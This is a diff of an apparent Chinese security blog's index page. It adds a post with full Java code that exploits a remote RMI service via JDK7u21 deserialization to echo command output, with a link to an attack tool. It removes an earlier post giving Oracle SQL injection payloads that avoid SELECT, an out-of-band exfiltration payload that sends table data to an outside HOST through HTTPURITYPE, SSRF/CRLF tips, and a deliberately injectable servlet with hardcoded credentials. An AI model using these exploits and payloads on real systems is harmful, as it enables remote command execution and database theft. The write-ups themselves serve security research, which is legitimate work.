@@ -63,6 +63,72 @@
 
   
     
+    <h3 class="article-title"><a href="/2021/12/30/java反序列之Jdk7u21回显-解决网络问题/"><span>java反序列之Jdk7u21回显 ~ 解决网络问题</span></a></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2021/12/30/java反序列之Jdk7u21回显-解决网络问题/" rel="bookmark">
+        <time class="entry-date published" datetime="2021-12-30T07:57:55.000Z">
+          2021-12-30
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <p>之前利用绑定服务的方式实现了回显，但是在部分场景下存在网络问题导致无法实现回显。</p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在服务绑定到注册中心时，服务的地址是通过解析Hostname得到。<br><a href="http://www.yulegeyu.com/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/">http://www.yulegeyu.com/2018/12/22/RMI-ReferenceWrapper-Stub-With-Hostname/</a></p>
+<p>这里就存在了问题，很多时候目标的Hostname解析结果并不是外网IP而是<strong>本机</strong>的内网IP，lookup时在客户端从注册中心拿到代理对象stub后，通过stub得到服务地址后，会在客户端与服务地址建立连接。如果是攻击外网的RMI服务，由于内网IP导致无法建立链接。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/12/30/16408478587040.jpg"></p>
+<p>从nmap的扫描结果也能看出这个问题。<br>虽然是内网IP，但是由于高版本JDK中注册中心和服务端必须在同一台机器上，所以通常这个内网IP都是本机的内网IP。那么只要将这个内网IP修改为外网IP，不存在安全策略的情况下依然能调用服务实现回显。</p>
+<p>sun.rmi.registry.RegistryImpl_Stub#lookup<br>接下来就走了一遍整个流程，发现只要修改了该方法中的var2对象中的incomingRefTable属性中的Host即可解决问题，这里通过反射修改该属性值。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/12/30/16408491123648.jpg"></p>
+<p>最开始准备使用Java Agent来解决，后面发现不用Hook直接将lookup方法给抽取出来也行。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">extends</span> <span class="title">RemoteObject</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Operation[] operations = <span class="keyword">new</span> Operation[]&#123;<span class="keyword">new</span> Operation(<span class="string">&quot;void bind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> Operation(<span class="string">&quot;java.lang.String list()[]&quot;</span>), <span class="keyword">new</span> Operation(<span class="string">&quot;java.rmi.Remote lookup(java.lang.String)&quot;</span>), <span class="keyword">new</span> Operation(<span class="string">&quot;void rebind(java.lang.String, java.rmi.Remote)&quot;</span>), <span class="keyword">new</span> Operation(<span class="string">&quot;void unbind(java.lang.String)&quot;</span>)&#125;;</span><br><span class="line">    <span class="keyword">private</span> RemoteRef ref = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">private</span> String ip = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Remote <span class="title">lookup</span><span class="params">(String var1)</span> <span class="keyword">throws</span> AccessException, NotBoundException, RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            StreamRemoteCall var2 = (StreamRemoteCall)<span class="keyword">this</span>.ref.newCall(<span class="keyword">this</span>, operations, <span class="number">2</span>, <span class="number">4905912898345647071L</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectOutput var3 = var2.getOutputStream();</span><br><span class="line">                var3.writeObject(var1);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException var15) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> MarshalException(<span class="string">&quot;error marshalling arguments&quot;</span>, var15);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">this</span>.ref.invoke(var2);</span><br><span class="line"></span><br><span class="line">            Remote var20;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ObjectInput var4 = var2.getInputStream();</span><br><span class="line">                var20 = (Remote)var4.readObject();</span><br><span class="line"></span><br><span class="line">                Field f = var2.getClass().getDeclaredField(<span class="string">&quot;in&quot;</span>);</span><br><span class="line">                f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                Object conn = f.get(var2);</span><br><span class="line"></span><br><span class="line">                f = conn.getClass().getDeclaredField(<span class="string">&quot;incomingRefTable&quot;</span>);</span><br><span class="line">                f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">                HashMap rets = (HashMap) f.get(conn);</span><br><span class="line"></span><br><span class="line">                Map.Entry&lt;TCPEndpoint, ArrayList&gt; entry = (Map.Entry&lt;TCPEndpoint, ArrayList&gt;) rets.entrySet().iterator().next();</span><br><span class="line"></span><br><span class="line">                f = entry.getKey().getClass().getDeclaredField(<span class="string">&quot;host&quot;</span>);</span><br><span class="line">                f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                f.set(entry.getKey(), <span class="keyword">this</span>.ip);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException | ClassCastException var13) &#123;</span><br><span class="line"><span class="comment">//                var2.discardPendingRefs();</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> UnmarshalException(<span class="string">&quot;error unmarshalling return&quot;</span>, var13);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.ref.done(var2);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> var20;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException var16) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var16;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException var17) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var17;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NotBoundException var18) &#123;</span><br><span class="line">            <span class="keyword">throw</span> var18;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var19) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnexpectedException(<span class="string">&quot;undeclared checked exception&quot;</span>, var19);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        String command = <span class="string">&quot;id&quot;</span>;</span><br><span class="line">        String ip = <span class="string">&quot;ip&quot;</span>;</span><br><span class="line">        Registry registry = LocateRegistry.getRegistry(ip, port);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//        for(String x:registry.list())&#123;</span></span><br><span class="line">        <span class="comment">//            System.out.println(x);</span></span><br><span class="line">        <span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        Subject subject = <span class="keyword">new</span> Subject();</span><br><span class="line">        Field f = subject.getClass().getDeclaredField(<span class="string">&quot;principals&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Set set = <span class="keyword">new</span> HashSet();</span><br><span class="line">        UnixPrincipal unixPrincipal = <span class="keyword">new</span> UnixPrincipal(command);</span><br><span class="line">        set.add(unixPrincipal);</span><br><span class="line">        f.set(subject, set);</span><br><span class="line"></span><br><span class="line">        f = registry.getClass().getSuperclass().getSuperclass().getDeclaredField(<span class="string">&quot;ref&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">        RMIClient r = <span class="keyword">new</span> RMIClient();</span><br><span class="line">        r.ref = (RemoteRef) f.get(registry);</span><br><span class="line">        r.ip = ip;</span><br><span class="line"></span><br><span class="line">        System.out.println(((RMIConnection)r.lookup(<span class="string">&quot;MonitorService&quot;</span>)).getDefaultDomain(subject));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/12/30/16408494809099.jpg"></p>
+<p>使用原生lookup时，建立连接失败导致无法回显命令结果。</p>
+<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2021/12/30/16408493504108.jpg"></p>
+<p>使用修改后的lookup方法成功回显。</p>
+<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/A-D-Team/attackRmi">https://github.com/A-D-Team/attackRmi</a></p>
+
+      
+    </div>
+
+  </div>
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+
+    
+
+    
+    
+
+    <span class="post-tags">
+      <i class="icon-tags"></i>
+        <a href="/tags/Web/">Web</a>
+    </span>
+    
+
+    </div>
+
+    
+  </div>
+</article>
+
+
+
+  <article>
+
+  
+    
     <h3 class="article-title"><a href="/2021/12/05/java反序列之Jdk7u21-回显/"><span>java反序列之Jdk7u21回显</span></a></h3>
     
   
@@ -955,80 +1021,6 @@
     <span class="post-tags">
       <i class="icon-tags"></i>
         <a href="/tags/Web/">Web</a>
-    </span>
-    
-
-    </div>
-
-    
-  </div>
-</article>
-
-
-
-  <article>
-
-  
-    
-    <h3 class="article-title"><a href="/2019/11/24/ORACLE-无SELECT注入/"><span>ORACLE 无SELECT注入</span></a></h3>
-    
-  
-
-  <div class="article-top-meta">
-    <span class="posted-on">
-      <a href="/2019/11/24/ORACLE-无SELECT注入/" rel="bookmark">
-        <time class="entry-date published" datetime="2019-11-24T10:43:37.000Z">
-          2019-11-24
-        </time>
-      </a>
-    </span>
-  </div>
-
-
-  
-
-  <div class="article-content">
-    <div class="entry">
-      
-        <p>在实际测试中, 经常遇到一出现SELECT就被拦截的场景, 对于无法多行查询的注入来说,一般遇到这种场景就告别出数据了(能出个user等信息)。闲着读ORACLE文档的时候, 发现ORACLE支持使用Xpath进行查询, 通过使用Xpath可以实现无SELECT查询数据。</p>
-<h2 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a></p>
-<blockquote>
-<p>Description of DBUriType<br>The DBUriType is a subtype of the UriType that provides support for of DBUri-refs. A DBUri-ref is an intra-database URL that can be used to reference any row or row-column data in the database. The URL is specified as an XPath expression over a XML visualization of the database. The schemas become elements which contain tables and views. These tables and view further contain the rows and columns inside them.</p>
-</blockquote>
-<p>从文档中可以看出DBUriType支持使用XPath表达式查询数据库中的数据。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_1.jpg" alt="-w724"></p>
-<p>从上图中能够看出虚拟视图的结构,很容易的能够看出uri的格式为/oradb/schemaname/tablename/ROW[predicate_expression],oradb可省略(也支持查询视图)。</p>
-<p>正常查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_2.jpg" alt="-w319"></p>
-<p>使用DBURITYPE查询结果。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_3.jpg" alt="-w338"></p>
-<p>本地用JDBC简单搭建个非dba ORACLE SQL注入环境。</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">String username = req.getParameter(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">resp.setHeader(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">resp.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;oracle.jdbc.driver.OracleDriver&quot;</span>);</span><br><span class="line">    Connection conn = DriverManager.getConnection(<span class="string">&quot;jdbc:oracle:thin:@39.108.232.59:49161:xe&quot;</span>, <span class="string">&quot;system&quot;</span>, <span class="string">&quot;oracle&quot;</span>);</span><br><span class="line">    Statement sts = conn.createStatement();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(username.toLowerCase().contains(<span class="string">&quot;select&quot;</span>))&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;含有非法字符&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    ResultSet rs = sts.executeQuery(String.format(<span class="string">&quot;select count(*) from HR.test where username = &#x27;%s&#x27;&quot;</span>, username));</span><br><span class="line">    rs.next();</span><br><span class="line">    <span class="keyword">int</span> row = rs.getInt(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(row &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;已注册&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        resp.getWriter().print(<span class="string">&quot;未注册&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>/oradb/schemaname/tablename/ROW[predicate_expression]</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select DBURITYPE(&#39;&#x2F;HR&#x2F;TEST&#x2F;ROW[USERNAME&#x3D;&quot;admin&quot;]&#x2F;USERNAME&#39;).getxml() from dual </span><br></pre></td></tr></table></figure>
-<p>在测试盲注时, 我没能在predicate_expression中实现模糊查询或者通配, 大概翻了下文档也没找到,只能够进行完整的匹配,不能模糊查询或者通配基本没法盲注。<br>所以在这里换成了使用extractvalue解析查询出来的xml再进行盲注。<br>/checkUsername?username=admin’ and extractvalue(DBURITYPE(‘/HR/TEST’).getxml(),’/TEST/ROW[1]/PASSWORD’)like’admin%25’–<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_4.jpg" alt="-w984"></p>
-<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_5.jpg" alt="-w1011"></p>
-<p>能够实现盲注, extractvalue容易被拦,可以换成extract进行盲注,需要查询第二行时修改为ROW[2]即可查询。<br>使用extract盲注时, 需注意查询出的xml结果会带有列名<code>&lt;PASSWORD&gt;admin&lt;/PASSWORD&gt;</code>。</p>
-<h3 id="OOB"><a href="#OOB" class="headerlink" title="OOB"></a>OOB</h3><p>oracle本身能够很容易的外带数据, 在能够发送HTTP请求出网时就不再需要盲注,这里直接使用httpuritype外带出dburitype查询出的数据。</p>
-<p>/checkUsername?username=a’ and HTTPURITYPE(‘<a target="_blank" rel="noopener" href="http://host/&#39;||">http://HOST/&#39;||</a> DBURITYPE(‘/HR/TEST’).getxml()).getcontenttype() is null–</p>
-<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_6.jpg" alt="-w1400"><br>外带出了表中的所有数据, 在表中数据数量过于庞大时发送GET请求可能会出现问题。可以使用上面的extract外带一行数据等方法。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_7.jpg" alt="-w902"></p>
-<h3 id="SSRF-CRLF"><a href="#SSRF-CRLF" class="headerlink" title="SSRF + CRLF"></a>SSRF + CRLF</h3><p>使用httpuritype发送HTTP请求存在CRLF问题, 在存在注入无法RCE时可以尝试打内网的redis等。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/ora_8.jpg" alt="-w1231"></p>
-<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694">https://docs.oracle.com/cd/B10501_01/appdev.920/a96616/arxml35.htm#1004694</a><br><a target="_blank" rel="noopener" href="https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143">https://docs.oracle.com/cd/B12037_01/appdev.101/b10790/xdb15dbu.htm#i1032143</a></p>
-
-      
-    </div>
-
-  </div>
-
-  <div class="article-footer">
-    <div class="article-meta pull-left">
-
-    
-
-    
-    
-
-    <span class="post-tags">
-      <i class="icon-tags"></i>
-        <a href="/tags/WEB/">WEB</a>
     </span>
     
 
